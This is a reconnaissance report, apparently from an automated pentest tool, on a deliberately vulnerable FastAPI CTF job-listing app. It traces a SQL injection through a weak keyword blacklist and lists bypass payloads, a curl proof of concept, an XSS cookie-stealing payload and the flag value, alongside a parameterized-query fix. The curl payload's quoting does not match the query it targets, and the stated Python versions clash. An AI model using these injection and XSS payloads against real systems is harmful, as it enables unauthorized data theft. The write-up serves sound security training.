# Reconnaissance Deliverable: Ultimate Job Aggregator

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the Ultimate Job Aggregator application's attack surface. The application is an intentionally vulnerable FastAPI-based CTF challenge with minimal functionality but critical security weaknesses.

**Key Sections:**
- **Section 4 (API Endpoint Inventory):** Complete catalog of all network-accessible endpoints with authorization details.
- **Section 5 (Potential Input Vectors):** Critical section identifying the single user input vector that leads to SQL injection.
- **Section 7 (Role & Privilege Architecture):** Documents the absence of proper authentication/authorization - access control is parameter-based, not identity-based.
- **Section 9 (Injection Sources):** Detailed tracing of the SQL injection vulnerability from input to database execution.

**Critical Finding:** The application has NO authentication system. Access control to "premium" jobs is enforced via a simple parameter check (`job_type == 'premium'`) that is bypassable through SQL injection due to weak input filtering and unsafe query construction.

**Priority for Downstream Analysis:**
- **Injection Analysis Specialist:** Focus on Section 9 - complete SQL injection source tracing with exact file:line references
- **XSS Analysis Specialist:** Frontend renders database content via innerHTML without sanitization - see Section 5
- **Auth/Authz Analysis Specialists:** NO authentication exists; single hardcoded authorization check at `main.py:45-47`

---

## 1. Executive Summary

**Application Name:** Ultimate Job Aggregator  
**Technology Stack:** FastAPI (Python 3.12.9) with SQLite database  
**Deployment:** Docker container on port 8000  
**Application Purpose:** Job listing aggregator with type-based filtering (CTF security challenge)

The Ultimate Job Aggregator is a minimal web application with only 74 lines of Python code exposing three HTTP endpoints. The application allows users to filter job listings by type (front-end, back-end) while blocking access to "premium" jobs through a hardcoded parameter check. 

**Critical Security Posture:**
- **NO authentication or session management** - completely stateless, no user identity tracking
- **Single SQL injection vulnerability** at `main.py:53` using f-string interpolation
- **Weak input validation** with bypassable blacklist filter
- **Client-side XSS risk** from unsanitized database content rendering
- **Sensitive data exposure** - CTF flag stored in database accessible via SQL injection

The attack surface is minimal but highly vulnerable. The single user input vector (`job_type` parameter) provides direct access to database compromise through SQL injection, bypassing the weak access control mechanism.

---

## 2. Technology & Service Map

### Frontend
- **Framework:** Vanilla JavaScript (no framework)
- **UI Library:** Bootstrap 4.5.2 (loaded from StackPath CDN)
- **Template Engine:** JavaScript template literals with innerHTML rendering
- **HTTP Client:** Native Fetch API
- **Security Issues:** 
  - No Subresource Integrity (SRI) for CDN resources
  - Unsanitized DOM insertion via innerHTML
  - No Content Security Policy

### Backend
- **Language:** Python 3.12.9
- **Framework:** FastAPI 0.116.0
- **ASGI Server:** Uvicorn 0.35.0 / WSGIServer 0.2
- **Database:** SQLite 3 (file-based at `/app/test.db`)
- **Key Dependencies:** 
  - fastapi==0.116.0
  - uvicorn==0.35.0
  - starlette==0.46.2
  - pydantic==2.12.3
- **Security Issues:**
  - No security middleware
  - No authentication libraries
  - No input validation libraries
  - No rate limiting

### Infrastructure
- **Hosting:** Docker container (tiangolo/uvicorn-gunicorn-fastapi:python3.9 base image)
- **Container Orchestration:** Docker Compose
- **Reverse Proxy:** None (direct application exposure)
- **CDN:** None (except Bootstrap CDN for frontend assets)
- **Database Engine:** SQLite (embedded, file-based)
- **Security Issues:**
  - HTTP-only (no TLS/HTTPS)
  - No WAF or security gateway
  - Secrets exposed in Docker build args
  - No network segmentation

### Identified Subdomains
**None** - Application runs on localhost:8000 only. No subdomain enumeration applicable.

### Open Ports & Services
Based on nmap scan from pre-recon deliverable:

| Port | Service | Purpose | Security Notes |
|------|---------|---------|----------------|
| 8000 | HTTP (WSGIServer/FastAPI) | **Target application** - Ultimate Job Aggregator | No authentication, SQL injection vulnerable |
| 80 | HTTP (Caddy) | Web server | Not related to target |
| 443 | HTTPS | SSL web service | Not related to target |
| 22 | SSH | Remote access | Not related to target |
| 5000 | HTTP (Werkzeug) | Dalgona Challenges | Out of scope |
| 8001 | HTTP (WSGIServer) | SSTI Demo | Out of scope |
| 8888 | HTTP (BaseHTTPServer) | SSRF Test Server | Out of scope |

**Primary Attack Surface:** Port 8000 - Ultimate Job Aggregator application

---

## 3. Authentication & Session Management Flow

### Entry Points
**NONE** - No authentication entry points exist in the application.

**Missing Endpoints:**
- No `/login` endpoint
- No `/register` endpoint  
- No `/auth/*` routes
- No OAuth/SSO integration
- No API key endpoints
- No password reset flows

### Mechanism
**NOT IMPLEMENTED** - The application has zero authentication infrastructure.

**Evidence:**
- File: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py:1-5`
- Imports: `json`, `FastAPI`, `HTTPException`, `Request`, `HTMLResponse`, `sqlite3`
- No authentication imports (no `Depends`, `OAuth2`, `HTTPBearer`, `Security`, etc.)
- No session libraries imported
- No user management code

### Code Pointers
**N/A** - No authentication or session management code exists in the codebase.

**Access Control Implementation:**
- **Location:** `app/main.py:45-47`
- **Type:** Input-based parameter check (NOT identity-based authorization)
- **Logic:**
  ```python
  if job_type and job_type == 'premium':
      conn.close()
      return HTMLResponse(content=json.dumps({"detail": "Access denied"}), status_code=403)
  ```
- **Security Issue:** Checks input parameter value, not user identity or role

### 3.1 Role Assignment Process

**NOT APPLICABLE** - No role system exists.

**Role Determination:** N/A - No user identity tracking  
**Default Role:** All users are anonymous  
**Role Upgrade Path:** N/A - No user accounts  
**Code Implementation:** No role assignment logic exists

### 3.2 Privilege Storage & Validation

**NOT APPLICABLE** - No privilege system exists.

**Storage Location:** N/A - No user privileges stored  
**Validation Points:** Single hardcoded check at `main.py:45-47` validates input parameter, not user privileges  
**Cache/Session Persistence:** N/A - Stateless application  
**Code Pointers:** Access control check at `app/main.py:45-47`

### 3.3 Role Switching & Impersonation

**NOT APPLICABLE** - No role system exists.

**Impersonation Features:** None  
**Role Switching:** None  
**Audit Trail:** None  
**Code Implementation:** No such features exist

---

## 4. API Endpoint Inventory

**Network Surface Focus:** All endpoints listed below are network-accessible via HTTP requests to `http://localhost:8000`. No local-only utilities or build tools are included.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|--------------|---------------|---------------------|------------------------|---------------------------|
| POST | `/jobs` | anon | None | Hardcoded parameter check | **PRIMARY ATTACK VECTOR** - Filters jobs by type. Vulnerable to SQL injection. Blocks `job_type='premium'` via hardcoded check at `main.py:45-47`. SQL query construction at `main.py:53` uses f-string (VULNERABLE). |
| GET | `/ping` | anon | None | None | Health check endpoint. Returns `{"ping": "pong"}`. Used by Docker healthcheck. See `main.py:64-66`. |
| GET | `/` | anon | None | None | Serves static HTML frontend from `static/index.html`. See `main.py:69-72`. |
| GET | `/docs` | anon | None | None | **AUTO-GENERATED** - FastAPI Swagger UI documentation. Exposes complete API structure. |
| GET | `/redoc` | anon | None | None | **AUTO-GENERATED** - FastAPI ReDoc documentation. Alternative API docs interface. |
| GET | `/openapi.json` | anon | None | None | **AUTO-GENERATED** - OpenAPI 3.1.0 schema specification. Reveals all endpoint details. |

**Critical Endpoint Details:**

### POST /jobs (Lines 39-61)
**Request Body:** `{"job_type": "<string>"}`  
**Valid job_type Values:** `""` (empty), `"front-end"`, `"back-end"`, or any custom string  
**Blocked Value:** `"premium"` (triggers 403 Forbidden)

**Response Formats:**
- **200 OK:** JSON array `[{"id": int, "name": str, "type": str, "description": str}]`
- **403 Forbidden:** `{"detail": "Access denied"}` when `job_type == "premium"`

**SQL Query Logic:**
- If `job_type` provided: `SELECT * FROM jobs WHERE type = '{job_type}'` (VULNERABLE - f-string)
- If empty: `SELECT * FROM jobs WHERE type IN ('front-end', 'back-end')`

**Vulnerability Chain:**
1. User input → `job_type` parameter (line 42)
2. Premium check → Blocks exact string `"premium"` (line 45)
3. Blacklist filter → Removes SQL keywords (lines 49-50) - **BYPASSABLE**
4. SQL injection → f-string interpolation (line 53) - **CRITICAL VULNERABILITY**
5. Query execution → Unparameterized query (line 57)

---

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only network-accessible input vectors are reported. No local scripts, build tools, or CLI utilities included.

### URL Parameters
**NONE** - Application does not process query string parameters.

### POST Body Fields (JSON)
| Parameter | Endpoint | Type | Location | Validation | Data Flow |
|-----------|----------|------|----------|------------|-----------|
| `job_type` | POST `/jobs` | String (optional) | `main.py:42` | Weak blacklist (lines 49-50) | `Input → Premium check → Filter → SQL query → Database` |

**Detailed Data Flow for job_type:**
```
1. JSON parsing: main.py:41
   - Code: data = await request.json()

2. Parameter extraction: main.py:42
   - Code: job_type = data.get('job_type', '')

3. Access control: main.py:45-47
   - Code: if job_type and job_type == 'premium':
             return HTTPResponse(..., status_code=403)

4. Input filtering: main.py:49-50
   - Code: for word in ['OR', 'or', 'AND', 'and', 'SELECT', 'select', 
                        'UNION', 'union', 'FROM', 'from', 'WHERE', 'where']:
             job_type = job_type.replace(word, '')

5. SQL query construction: main.py:53 [VULNERABLE]
   - Code: query = f"SELECT * FROM jobs WHERE type = '{job_type}'"

6. Query execution: main.py:57 [DANGEROUS SINK]
   - Code: cursor.execute(query)

7. Database response: main.py:58
   - Code: jobs = cursor.fetchall()

8. JSON response: main.py:60-61
   - Returns list of job objects

9. Client-side rendering: static/index.html:63-74
   - VULNERABLE: innerHTML without sanitization
```

### HTTP Headers
**NONE** - Application does not read custom HTTP headers. Only standard FastAPI request parsing.

**Verified:** No code accesses `request.headers` for custom header processing.

### Cookie Values
**NONE** - Application does not set or read cookies.

**Verified:** 
- No `response.set_cookie()` calls in backend
- No `document.cookie` access in frontend
- Stateless application with no session management

### File Uploads
**NONE** - No file upload functionality exists.

### WebSocket/Real-time Inputs
**NONE** - Application uses HTTP-only, no WebSocket endpoints.

---

## 6. Network & Interaction Map

**Network Surface Focus:** Only network-accessible, deployed infrastructure components are mapped. Build CI systems, local development tools, and non-deployed components excluded.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| UserBrowser | ExternAsset | Internet | Web Browser | None | External users accessing the application |
| UltimateJobAggregator | Service | App | Python/FastAPI | PII (flag), Public | Main application backend on port 8000 |
| SQLiteDB | DataStore | Data | SQLite 3 | PII (flag), Public | Embedded database at `/app/test.db` |
| BootstrapCDN | ThirdParty | Internet | CDN | Public | stackpath.bootstrapcdn.com - CSS framework |

### 6.2 Entity Metadata

| Title | Metadata Key: Value |
|-------|-------------------|
| UltimateJobAggregator | Hosts: `http://localhost:8000`; Endpoints: `/jobs`, `/ping`, `/`, `/docs`, `/redoc`, `/openapi.json`; Auth: None; Dependencies: SQLiteDB; Container: Docker (tiangolo/uvicorn-gunicorn-fastapi:python3.9); Server: Uvicorn/WSGIServer 0.2; Framework: FastAPI 0.116.0 |
| SQLiteDB | Engine: `SQLite 3`; Location: `/app/test.db`; Exposure: `Local to container only`; Consumers: `UltimateJobAggregator`; Access: `File-based, no network`; Encryption: `None`; Tables: `jobs (id, name, type, description)` |
| UserBrowser | Type: `HTTP Client`; Access: `Public Internet`; Protocols: `HTTP`; Features: `JavaScript, Fetch API, Bootstrap CSS` |
| BootstrapCDN | Domain: `stackpath.bootstrapcdn.com`; Resource: `bootstrap/4.5.2/css/bootstrap.min.css`; SRI: `Not configured`; Risk: `MITM attack potential` |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| UserBrowser → UltimateJobAggregator | HTTP | `:8000 /` | None | Public |
| UserBrowser → UltimateJobAggregator | HTTP | `:8000 /jobs` | None | PII (flag accessible via SQLi) |
| UserBrowser → UltimateJobAggregator | HTTP | `:8000 /ping` | None | Public |
| UserBrowser → UltimateJobAggregator | HTTP | `:8000 /docs` | None | Public (API schema disclosure) |
| UserBrowser → BootstrapCDN | HTTPS | `:443 /bootstrap/4.5.2/css/bootstrap.min.css` | None | Public |
| UltimateJobAggregator → SQLiteDB | File | `/app/test.db` | container-local | PII (flag), Public |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | N/A | No guards implemented - all endpoints publicly accessible without authentication |
| container-local | Env | SQLite database file accessible only within the Docker container filesystem |
| premium-block | Authorization | Hardcoded parameter check: blocks requests where `job_type == 'premium'` (bypassable via SQL injection) |

**Note:** The "premium-block" is NOT a true security guard - it's a simple input parameter check that can be bypassed through SQL injection due to unsafe query construction.

---

## 7. Role & Privilege Architecture

**CRITICAL FINDING:** This application has NO role-based access control, NO authentication system, and NO user identity management. All users operate as anonymous with identical access levels.

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|----------------|--------------|-------------------|
| anonymous | 0 (only level) | Global | Default for all users - no authentication required |

**Note:** The application has NO formal role system. All users are anonymous. The "premium" job type is NOT a role - it's a data classification with a hardcoded access restriction.

### 7.2 Privilege Lattice

```
NO PRIVILEGE HIERARCHY EXISTS

All users: anonymous (level 0)
  ↓
Can access: front-end jobs, back-end jobs
  ↓
Blocked from: premium jobs (via parameter check, bypassable)

No role elevation possible (no authentication exists)
```

**Authorization Model:** Input-based, NOT identity-based
- Access control checks the `job_type` parameter value
- Does NOT check user identity, role claims, or permissions
- No role switching or impersonation (no user accounts exist)

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|---------------------|
| anonymous | `/` | ALL routes (`/`, `/jobs`, `/ping`, `/docs`, `/redoc`, `/openapi.json`) | None required |

**Note:** No authentication gates exist. All endpoints are publicly accessible.

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|------------------|-------------------|------------------|
| anonymous | None | Single hardcoded check: `if job_type == 'premium'` at `main.py:45` | N/A - no role storage |

**Authorization Check Implementation:**
```python
# main.py:45-47
if job_type and job_type == 'premium':
    conn.close()
    return HTMLResponse(content=json.dumps({"detail": "Access denied"}), status_code=403)
```

---

## 8. Authorization Vulnerability Candidates

**CRITICAL NOTE:** This application has NO authentication or role-based authorization. The single "authorization" check is a hardcoded parameter validation that blocks access to "premium" jobs based on input value, not user identity.

### 8.1 Horizontal Privilege Escalation Candidates

**NOT APPLICABLE** - No user accounts or object ownership exists.

The application has:
- No user identity system
- No object ownership model
- No user-specific data (all data is shared/global)
- No multi-user authorization boundaries

**Why IDOR is impossible:** Insecure Direct Object Reference requires user contexts and object ownership. This application has neither.

### 8.2 Vertical Privilege Escalation Candidates

**NOT APPLICABLE** - No role hierarchy exists to escalate through.

**Current State:**
- All users are anonymous
- No "admin" role exists
- No privilege levels to escalate
- Single access control: blocking `job_type='premium'` parameter

**"Premium" Job Access:**
While there is a "premium" job type blocked by the application, this is NOT vertical privilege escalation in the traditional sense because:
- It's not tied to user roles or identities
- It's enforced via parameter validation, not role checks
- Bypass is achieved via SQL injection, not authorization bypass

| Target Data | Endpoint Pattern | Bypass Method | Risk Level |
|-------------|-----------------|---------------|-----------|
| Premium jobs (containing flag) | POST `/jobs` with `job_type='premium'` | SQL injection via weak input filtering | **CRITICAL** |

### 8.3 Context-Based Authorization Candidates

**NOT APPLICABLE** - No multi-step workflows exist.

**Application Flows:**
- Single-step operation: Submit job type → Get filtered results
- No wizard flows
- No checkout processes
- No multi-step form submissions
- No state-dependent operations

**State Management:** Completely stateless - each request is independent

---

## 9. Injection Sources (Command Injection and SQL Injection)

**Network Surface Focus:** Only network-accessible code paths analyzed. Local scripts, build tools, and CLI utilities excluded.

### SQL Injection Sources

#### CRITICAL: SQL Injection in POST /jobs Endpoint

**TYPE:** SQL Injection  
**SEVERITY:** CRITICAL  
**CVSS IMPACT:** Complete database access, sensitive data exposure (flag extraction)

**INPUT SOURCE:** `job_type` parameter in POST `/jobs` request body

**COMPLETE DATA FLOW:**

```
STEP 1: User Input Entry Point
  Location: /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py:41
  Code: data = await request.json()
  Description: FastAPI parses incoming JSON request body

STEP 2: Parameter Extraction
  Location: /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py:42
  Code: job_type = data.get('job_type', '')
  Description: Extracts job_type parameter with empty string default

STEP 3: Database Connection
  Location: /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py:43-44
  Code: conn = get_db_connection()
        cursor = conn.cursor()
  Description: Opens SQLite database connection

STEP 4: Access Control Check
  Location: /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py:45-47
  Code: if job_type and job_type == 'premium':
            conn.close()
            return HTMLResponse(content=json.dumps({"detail": "Access denied"}), 
                               status_code=403)
  Description: Blocks exact string match 'premium' - SQL injection can bypass this

STEP 5: Weak Input Sanitization [BYPASSABLE]
  Location: /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py:49-50
  Code: for word in ['OR', 'or', 'AND', 'and', 'SELECT', 'select', 
                     'UNION', 'union', 'FROM', 'from', 'WHERE', 'where']:
            job_type = job_type.replace(word, '')
  Description: Simple string replacement blacklist filter
  Weaknesses:
    - Not recursive (nested keywords bypass: 'ORor' → 'or')
    - Case-sensitive pairs only (mixed case bypass: 'oR', 'Or')
    - Incomplete keyword list (missing: LIKE, GLOB, LIMIT, OFFSET, etc.)
    - No comment filtering (--, /* */)
    - No quote character filtering

STEP 6: Vulnerable SQL Query Construction [CRITICAL VULNERABILITY]
  Location: /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py:53
  Code: query = f"SELECT * FROM jobs WHERE type = '{job_type}'"
  Description: Direct f-string interpolation - user input inserted into SQL without parameterization
  Vulnerability Type: SQL Injection via string concatenation

STEP 7: Dangerous Sink - Query Execution
  Location: /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py:57
  Code: cursor.execute(query)
  Description: Executes the user-controlled SQL query

STEP 8: Result Processing
  Location: /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py:58
  Code: jobs = cursor.fetchall()
  Description: Retrieves all query results

STEP 9: JSON Response
  Location: /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py:60-61
  Code: return [{"id": job["id"], "name": job["name"], "type": job["type"],
                 "description": job["description"]} for job in jobs]
  Description: Returns database results as JSON (including any injected data)
```

**VULNERABLE CODE SNIPPET:**
```python
# /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py:39-61

@app.post("/jobs")
async def jobs(request: Request):
    data = await request.json()                    # Line 41: Entry point
    job_type = data.get('job_type', '')            # Line 42: Extract parameter
    conn = get_db_connection()                     # Line 43
    cursor = conn.cursor()                         # Line 44
    
    if job_type and job_type == 'premium':         # Line 45: Access control
        conn.close()                               # Line 46
        return HTMLResponse(content=json.dumps({"detail": "Access denied"}), 
                           status_code=403)        # Line 47
    
    for word in ['OR', 'or', 'AND', 'and', 'SELECT', 'select', 
                 'UNION', 'union', 'FROM', 'from', 'WHERE', 'where']:
        job_type = job_type.replace(word, '')      # Line 49-50: Weak filter
    
    if job_type:
        query = f"SELECT * FROM jobs WHERE type = '{job_type}'"  # Line 53: INJECTION
    else:
        query = "SELECT * FROM jobs WHERE type IN ('front-end', 'back-end')"
    
    cursor.execute(query)                          # Line 57: Dangerous sink
    jobs = cursor.fetchall()                       # Line 58
    conn.close()                                   # Line 59
    return [{"id": job["id"], "name": job["name"], "type": job["type"],
             "description": job["description"]} for job in jobs]  # Line 60-61
```

**VALIDATION ANALYSIS:**

Current sanitization (Lines 49-50):
- **Type:** Blacklist filter
- **Implementation:** Simple string replacement
- **Filtered Keywords:** OR, or, AND, and, SELECT, select, UNION, union, FROM, from, WHERE, where

**Bypass Techniques:**

1. **Nested Keyword Bypass:**
   - Input: `ORor` → Filter removes `OR` → Result: `or` (bypasses filter)
   - Input: `SELSELECTECT` → Filter removes `SELECT` → Result: `SELECT`
   - Input: `UNUNIONION` → Filter removes `UNION` → Result: `UNION`

2. **Case Variation Bypass:**
   - Mixed case not in blacklist: `Or`, `oR`, `AnD`, `aNd`, `SeLeCt`, `UnIoN`

3. **Alternative SQL Syntax:**
   - `LIKE` operator (not filtered)
   - `GLOB` operator (not filtered)
   - Comment syntax: `--`, `/* */` (not filtered)
   - Semicolon `;` for statement termination (not filtered)
   - Quote manipulation to break string context

4. **SQL Injection Payload Examples:**
   ```sql
   -- Boolean-based bypass (nested keyword)
   ' ORor type='premium' --
   
   -- Case variation bypass
   ' oR type='premium' --
   
   -- UNION-based injection (nested bypass)
   ' UNUNIONION SELSELECTECT * FRFROMOM jobs --
   
   -- Comment-based bypass
   ' OR/**/type='premium' --
   
   -- Alternative operator
   ' OR type LIKE 'premium' --
   ```

**EXPLOITABILITY:** **CRITICAL - EASILY EXPLOITABLE**

**Attack Impact:**
- Extract all database records including "premium" jobs containing the flag
- Bypass access control check (line 45-47)
- Enumerate database schema
- Extract sensitive data: `flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}`
- Potential for database modification (INSERT, UPDATE, DELETE if SQLite permits)
- Timing-based blind SQL injection for data exfiltration

**Proof of Concept:**
```bash
# Bypass premium check and extract flag
curl -X POST http://localhost:8000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "\" ORor type=\"premium\" --"}'

# Expected response (after successful bypass):
# [{"id": 3, "name": "Executive Position", "type": "premium", 
#   "description": "flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}"}]
```

**Sensitive Data Exposure:**

Database schema (`main.py:22-27`):
```python
CREATE TABLE IF NOT EXISTS jobs (
    id INTEGER PRIMARY KEY,
    name TEXT,
    type TEXT,
    description TEXT
)
```

Flag storage (`main.py:33`):
```python
f'("Executive Position", "premium", "{flag}"), '
```

The flag is loaded from `/app/flag.txt` at startup and inserted into the database's `description` field for the "premium" job entry.

**Recommended Fix:**
```python
# Replace line 53 with parameterized query:
if job_type:
    query = "SELECT * FROM jobs WHERE type = ?"
    cursor.execute(query, (job_type,))
else:
    query = "SELECT * FROM jobs WHERE type IN ('front-end', 'back-end')"
    cursor.execute(query)
```

---

### Command Injection Sources

**RESULT: NO COMMAND INJECTION SOURCES FOUND**

**Analysis Performed:**
- Searched entire codebase for command execution functions
- No `subprocess` module imports
- No `os.system()` calls
- No `os.popen()` usage
- No `eval()` or `exec()` with user input
- No shell command construction

**Files Analyzed:**
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/main.py` (complete application)
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/static/index.html` (frontend)

**Conclusion:** Application contains NO command injection attack surface in network-accessible code paths.

---

### Summary

**Total Injection Sources:** 1  
**SQL Injection Sources:** 1 (CRITICAL severity)  
**Command Injection Sources:** 0

**Critical Vulnerability:** SQL injection in `POST /jobs` endpoint at `main.py:53` enables complete database access and bypass of access controls to retrieve the CTF flag from premium job entries.

---

## 10. Additional Findings

### XSS Vulnerability Chain (Stored XSS via SQL Injection)

**TYPE:** Stored Cross-Site Scripting  
**SEVERITY:** HIGH  
**ATTACK VECTOR:** SQL injection enables XSS payload injection

**Data Flow:**
```
1. Attacker injects XSS payload via SQL injection into database
2. Malicious data stored in jobs table (name, type, or description fields)
3. Subsequent users request job listings
4. Server returns JSON with XSS payload
5. Client-side JavaScript renders data via innerHTML (VULNERABLE)
6. XSS executes in victim's browser
```

**Vulnerable Client-Side Code:**
```javascript
// static/index.html:63-74
data.forEach(user => {
    jobsTable += `
        <tr>
            <td>${user.id}</td>
            <td>${user.name}</td>
            <td>${user.type}</td>
            <td>${user.description}</td>   // User data from DB
        </tr>
    `;
});
resultDiv.innerHTML = jobsTable;  // VULNERABLE: No sanitization
```

**Location:** `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-006-24/app/static/index.html:74`

**Exploitation:** Attacker uses SQL injection to insert XSS payloads like `<img src=x onerror=alert(document.cookie)>` into database fields, which execute when rendered by victims.

### Information Disclosure

**Auto-Generated API Documentation:**
- `/docs` - Swagger UI exposing complete API structure
- `/redoc` - ReDoc interface with detailed endpoint documentation
- `/openapi.json` - Machine-readable OpenAPI 3.1.0 specification

**Security Impact:** Reveals all endpoint paths, parameter names, request/response formats to attackers.

### Missing Security Headers

**Analysis:** No security headers configured.

**Missing Headers:**
- `Content-Security-Policy` - Would prevent XSS
- `X-Frame-Options` - Allows clickjacking
- `X-Content-Type-Options` - Enables MIME-sniffing attacks
- `Strict-Transport-Security` - N/A (HTTP only, no HTTPS)
- `Referrer-Policy` - Information leakage via referrer

### Secret Management Issues

**Flag Exposure Points:**
1. `.env` file - Plaintext: `FLAG="flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}"`
2. Docker build ARG - Visible in `docker history`
3. Container filesystem - `/app/flag.txt` readable
4. Database - jobs table, description column
5. Application memory - Flag loaded at startup

**Risk:** Multiple extraction methods beyond SQL injection (Docker image inspection, file access if container compromised).

---

## Conclusion

The Ultimate Job Aggregator presents a **minimal but highly vulnerable attack surface**. With only three custom endpoints and a single user input vector, the application demonstrates critical security failures:

**Primary Attack Path:**
1. Identify SQL injection in `POST /jobs` endpoint (`job_type` parameter)
2. Bypass weak blacklist filter using nested keywords or case variations
3. Craft SQL injection payload to access "premium" jobs
4. Extract flag from database: `flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}`

**Key Weaknesses:**
- No authentication or session management
- SQL injection via unsafe f-string query construction
- Weak, bypassable input validation
- Client-side XSS via innerHTML rendering
- Sensitive data stored in plaintext database
- No defense-in-depth security controls

This reconnaissance provides complete attack surface intelligence for downstream vulnerability analysis specialists.